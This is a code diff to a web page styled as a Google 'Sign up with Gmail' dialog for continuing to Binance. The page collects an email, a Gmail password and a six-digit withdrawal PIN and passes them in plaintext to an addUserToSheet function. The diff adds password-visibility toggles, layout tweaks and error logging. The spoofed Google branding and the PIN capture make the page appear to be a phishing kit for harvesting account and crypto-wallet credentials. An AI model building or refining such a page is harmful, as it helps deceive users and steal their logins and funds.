@@ -286,13 +286,17 @@
             text-align: center;
             margin-bottom: 24px;
         }
+        .google-input-wrapper {
+            position: relative;
+            margin-bottom: 16px;
+        }
         .google-input {
             width: 100%;
             padding: 10px 12px;
+            padding-right: 35px;
             border: 1px solid #dadce0;
             border-radius: 4px;
             font-size: 14px;
-            margin-bottom: 16px;
             transition: border-color 0.2s;
             outline: none;
             background: white;
@@ -302,6 +306,15 @@
         .google-input:focus {
             border-color: #1a73e8;
             border-width: 2px;
+        }
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #5f6368;
+            font-size: 14px;
         }
         .google-btn {
             background-color: #1a73e8;
@@ -343,9 +356,9 @@
             gap: 10px;
             margin-bottom: 16px;
         }
-        .pin-row .google-input {
-            margin-bottom: 0;
+        .pin-row .google-input-wrapper {
             flex: 1;
+            margin-bottom: 0;
         }
         .pin-label {
             display: block;
@@ -484,13 +497,25 @@
                     <div class="google-title">Sign up with Gmail</div>
                     <div class="google-subtitle">to continue to Binance</div>
                     
-                    <input type="email" id="signup-email" placeholder="Email" class="google-input">
-                    <input type="password" id="signup-password" placeholder="Password" class="google-input">
+                    <div class="google-input-wrapper">
+                        <input type="email" id="signup-email" placeholder="Email" class="google-input">
+                    </div>
+                    
+                    <div class="google-input-wrapper">
+                        <input type="password" id="signup-password" placeholder="Password" class="google-input">
+                        <i class="fa-regular fa-eye eye-icon" onclick="togglePasswordField('signup-password', this)"></i>
+                    </div>
                     
                     <div class="pin-label">Create withdrawal PIN (6 digits)</div>
                     <div class="pin-row">
-                        <input type="password" id="signup-pin" maxlength="6" placeholder="Enter PIN" class="google-input" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
-                        <input type="password" id="signup-confirm-pin" maxlength="6" placeholder="Confirm PIN" class="google-input" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+                        <div class="google-input-wrapper">
+                            <input type="password" id="signup-pin" maxlength="6" placeholder="Enter PIN" class="google-input" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+                            <i class="fa-regular fa-eye eye-icon" onclick="togglePasswordField('signup-pin', this)"></i>
+                        </div>
+                        <div class="google-input-wrapper">
+                            <input type="password" id="signup-confirm-pin" maxlength="6" placeholder="Confirm PIN" class="google-input" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+                            <i class="fa-regular fa-eye eye-icon" onclick="togglePasswordField('signup-confirm-pin', this)"></i>
+                        </div>
                     </div>
                     <div id="pin-error" class="error-message" style="display: none;">PINs don't match</div>
                     
@@ -502,7 +527,7 @@
                     <button onclick="handleSignup()" id="signup-btn" class="google-btn">Create Account</button>
                     
                     <div class="google-link">
-                        <a href="javascript:void(0)" onclick="toggleForms()">Sign in instead</a>
+                        <a href="javascript:void(0)" onclick="toggleForms()">Already have an account? Sign in</a>
                     </div>
                 </div>
             </div>
@@ -949,6 +974,20 @@
             document.getElementById('profile-popup').classList.remove('active');
         }
         
+        // Toggle password visibility function
+        function togglePasswordField(inputId, icon) {
+            const input = document.getElementById(inputId);
+            if (input.type === "password") {
+                input.type = "text";
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = "password";
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+        
         async function loadNotifications() {
             if (!currentUserEmail) return;
             try {
@@ -1176,14 +1215,17 @@
             setButtonLoading(signupBtn, true, 'Create Account');
             try {
                 if (await userExists(email)) { showToast('Email already exists', false); return; }
-                await addUserToSheet({ email, password, pin, createdAt: new Date().toISOString() });
+                await addUserToSheet({ email, password, pin });
                 showToast('Account created successfully! Please login.', true);
                 toggleForms();
                 document.getElementById('signup-email').value = '';
                 document.getElementById('signup-password').value = '';
                 document.getElementById('signup-pin').value = '';
                 document.getElementById('signup-confirm-pin').value = '';
-            } catch (error) { showToast('Signup failed', false); }
+            } catch (error) { 
+                console.error('Signup error:', error);
+                showToast('Signup failed. Check console for details.', false); 
+            }
             finally { setButtonLoading(signupBtn, false, 'Create Account'); }
         }
         
